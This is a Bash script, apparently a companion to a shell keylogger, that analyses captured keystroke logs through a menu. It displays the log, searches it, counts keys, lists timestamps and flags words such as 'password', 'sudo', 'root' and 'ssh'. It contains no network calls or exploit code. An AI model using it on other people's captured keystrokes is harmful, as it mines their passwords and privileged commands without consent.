#!/bin/bash

function banner() {
    echo "==========================================="
    echo "  Log Analyzer - Shell Keylogger"
    echo "  v1.0"
    echo "==========================================="
    echo ""
}

function usage() {
    banner
    echo "Usage: $0 <log_file>"
    echo ""
    echo "Analysis options:"
    echo "  1. Display all content"
    echo "  2. Search keywords"
    echo "  3. Keystroke statistics"
    echo "  4. Events timeline"
    echo "  5. Detect sensitive commands"
    echo ""
    exit 1
}

function display_all() {
    local log_file="$1"
    echo "[Complete log content]"
    echo "========================"
    cat "$log_file"
    echo ""
}

function search_keyword() {
    local log_file="$1"
    echo -n "Enter keyword to search: "
    read keyword
    echo ""
    echo "[Results for: $keyword]"
    echo "============================="
    grep -i "$keyword" "$log_file" | nl
    echo ""
}

function statistics() {
    local log_file="$1"
    echo "[Keystroke statistics]"
    echo "========================"
    
    total_keys=$(grep -v "^\[" "$log_file" | wc -l)
    enter_count=$(grep -c "<ENTER>" "$log_file")
    backspace_count=$(grep -c "<BACKSPACE>" "$log_file")
    tab_count=$(grep -c "<TAB>" "$log_file")
    esc_count=$(grep -c "<ESC>" "$log_file")
    
    echo "Total keys: $total_keys"
    echo "ENTER keys: $enter_count"
    echo "BACKSPACE keys: $backspace_count"
    echo "TAB keys: $tab_count"
    echo "ESC keys: $esc_count"
    echo ""
}

function timeline() {
    local log_file="$1"
    echo "[Events timeline]"
    echo "==========================="
    
    awk -F'[][]' '{if ($2) print $2}' "$log_file" | sort -u
    echo ""
}

function detect_sensitive() {
    local log_file="$1"
    echo "[Sensitive commands detection]"
    echo "===================================="
    
    sensitive_words=("password" "passwd" "sudo" "root" "ssh" "admin" "secret")
    
    for word in "${sensitive_words[@]}"; do
        count=$(grep -ic "$word" "$log_file")
        if [ $count -gt 0 ]; then
            echo "[ALERT] Sensitive word '$word' detected $count times"
        fi
    done
    echo ""
}

function interactive_menu() {
    local log_file="$1"
    
    while true; do
        echo "[Analysis menu]"
        echo "================"
        echo "1. Display all content"
        echo "2. Search keywords"
        echo "3. Keystroke statistics"
        echo "4. Events timeline"
        echo "5. Detect sensitive commands"
        echo "6. Quit"
        echo ""
        echo -n "Your choice: "
        read choice
        echo ""
        
        case $choice in
            1)
                display_all "$log_file"
                ;;
            2)
                search_keyword "$log_file"
                ;;
            3)
                statistics "$log_file"
                ;;
            4)
                timeline "$log_file"
                ;;
            5)
                detect_sensitive "$log_file"
                ;;
            6)
                echo "Goodbye!"
                exit 0
                ;;
            *)
                echo "[ERROR] Invalid option"
                echo ""
                ;;
        esac
        
        echo -n "Press Enter to continue..."
        read
        clear
        banner
    done
}

if [ $# -eq 0 ]; then
    usage
fi

LOG_FILE="$1"

if [ ! -f "$LOG_FILE" ]; then
    echo "[ERROR] File not found: $LOG_FILE"
    exit 1
fi

clear
banner
interactive_menu "$LOG_FILE"
